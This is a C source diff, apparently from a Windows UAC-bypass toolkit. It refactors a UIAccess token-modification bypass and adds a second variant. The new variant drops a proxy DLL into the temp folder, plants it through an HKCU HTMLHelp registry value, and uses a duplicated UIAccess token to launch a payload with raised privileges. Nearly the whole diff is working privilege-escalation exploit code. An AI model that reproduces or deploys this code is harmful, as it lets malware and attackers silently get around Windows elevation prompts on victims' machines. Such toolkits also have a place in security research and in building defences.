@@ -176,7 +176,9 @@ NTSTATUS ucmDiskCleanupEnvironmentVariable(
 */
 BOOL ucmxTokenModUIAccessMethodInitPhase(
     _In_ PVOID ProxyDll,
-    _In_ DWORD ProxyDllSize
+    _In_ DWORD ProxyDllSize,
+    _In_ LPCSTR EntryPointName,
+    _In_ LPCWSTR PayloadFileName
 )
 {
     BOOL bResult = FALSE;
@@ -188,7 +190,7 @@ BOOL ucmxTokenModUIAccessMethodInitPhase(
     //
     if (supReplaceDllEntryPoint(ProxyDll,
         ProxyDllSize,
-        FUBUKI_ENTRYPOINT_UIACCESS2,
+        EntryPointName,
         TRUE))
     {
         //
@@ -196,7 +198,7 @@ BOOL ucmxTokenModUIAccessMethodInitPhase(
         //
         RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
         _strcpy(szBuffer, g_ctx->szTempDirectory);
-        _strcat(szBuffer, PKGMGR_EXE);
+        _strcat(szBuffer, PayloadFileName);
         bResult = supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize);
     }
 
@@ -204,16 +206,19 @@ BOOL ucmxTokenModUIAccessMethodInitPhase(
 }
 
 /*
-* ucmTokenModUIAccessMethod
+* ucmxTokenModUIAccessExec
 *
 * Purpose:
 *
 * Obtain token from UIAccess application, modify it and reuse for UAC bypass.
 *
 */
-NTSTATUS ucmTokenModUIAccessMethod(
+NTSTATUS ucmxTokenModUIAccessExec(
     _In_ PVOID ProxyDll,
-    _In_ DWORD ProxyDllSize
+    _In_ DWORD ProxyDllSize,
+    _In_ LPCSTR EntryPointName,
+    _In_ LPCWSTR PayloadFileName,
+    _In_ UCM_METHOD Method
 )
 {
     NTSTATUS Status = STATUS_ACCESS_DENIED;
@@ -236,8 +241,13 @@ NTSTATUS ucmTokenModUIAccessMethod(
         //
         // Tweak and drop payload to %temp%.
         //
-        if (!ucmxTokenModUIAccessMethodInitPhase(ProxyDll, ProxyDllSize))
+        if (!ucmxTokenModUIAccessMethodInitPhase(ProxyDll,
+            ProxyDllSize,
+            EntryPointName,
+            PayloadFileName))
+        {
             break;
+        }
 
         //
         // Spawn OSK.exe process.
@@ -308,10 +318,12 @@ NTSTATUS ucmTokenModUIAccessMethod(
         _strcpy(szBuffer, g_ctx->szTempDirectory);
         _strcat(szBuffer, PKGMGR_EXE);
 
-        if (g_ctx->OptionalParameterLength == 0)
-            lpszPayload = g_ctx->szDefaultPayload;
-        else
-            lpszPayload = g_ctx->szOptionalParameter;
+        if (Method == UacMethodTokenModUiAccess) {
+            if (g_ctx->OptionalParameterLength == 0)
+                lpszPayload = g_ctx->szDefaultPayload;
+            else
+                lpszPayload = g_ctx->szOptionalParameter;
+        }
 
         if (CreateProcessAsUser(hDupToken,
             szBuffer,    //application
@@ -346,9 +358,84 @@ NTSTATUS ucmTokenModUIAccessMethod(
     if (pIntegritySid) RtlFreeSid(pIntegritySid);
 
     _strcpy(szBuffer, g_ctx->szTempDirectory);
-    _strcat(szBuffer, PKGMGR_EXE);
+    _strcat(szBuffer, PayloadFileName);
     DeleteFile(szBuffer);
 
+    return Status;
+}
+
+/*
+* ucmTokenModUIAccessMethod
+*
+* Purpose:
+*
+* Obtain token from UIAccess application, modify it and reuse for UAC bypass.
+*
+*/
+NTSTATUS ucmTokenModUIAccessMethod(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    return ucmxTokenModUIAccessExec(ProxyDll, ProxyDllSize,
+        FUBUKI_ENTRYPOINT_UIACCESS2, PKGMGR_EXE,
+        UacMethodTokenModUiAccess);
+}
+
+/*
+* ucmTokenModUIAccessMethod2
+*
+* Purpose:
+*
+* Variant inspired by Stefan Kanthak findings. Based on same tyranid UIAccess bypass.
+*
+*/
+NTSTATUS ucmTokenModUIAccessMethod2(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    HKEY hKey;
+    LRESULT lResult;
+    NTSTATUS Status = STATUS_ACCESS_DENIED;
+    SIZE_T sz;
+    WCHAR szPayload[MAX_PATH * 2];
+
+    _strcpy(szPayload, g_ctx->szTempDirectory);
+    _strcat(szPayload, THEOLDNEWTHING);
+    _strcat(szPayload, TEXT(".dll"));
+
+    if (supWriteBufferToFile(szPayload, ProxyDll, ProxyDllSize)) {
+
+        hKey = NULL;
+        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, T_HTMLHELP_AUTHOR, 0, NULL,
+            REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
+        if (lResult == ERROR_SUCCESS) {
+
+            sz = (1 + _strlen(szPayload)) * sizeof(WCHAR);
+            lResult = RegSetValueEx(hKey,
+                T_LOCATION,
+                0,
+                REG_SZ,
+                (BYTE*)szPayload,
+                (DWORD)sz);
+
+            if (lResult == ERROR_SUCCESS) {
+
+                Status = ucmxTokenModUIAccessExec(ProxyDll,
+                    ProxyDllSize,
+                    FUBUKI_ENTRYPOINT_UIACCESS3,
+                    PKGMGR_EXE,
+                    UacMethodTokenModUiAccess2);
+
+            }
+
+            RegCloseKey(hKey);
+        }
+
+        RegDeleteKey(HKEY_CURRENT_USER, T_HTMLHELP_AUTHOR);
+        DeleteFile(szPayload);
+    }
     return Status;
 }
 
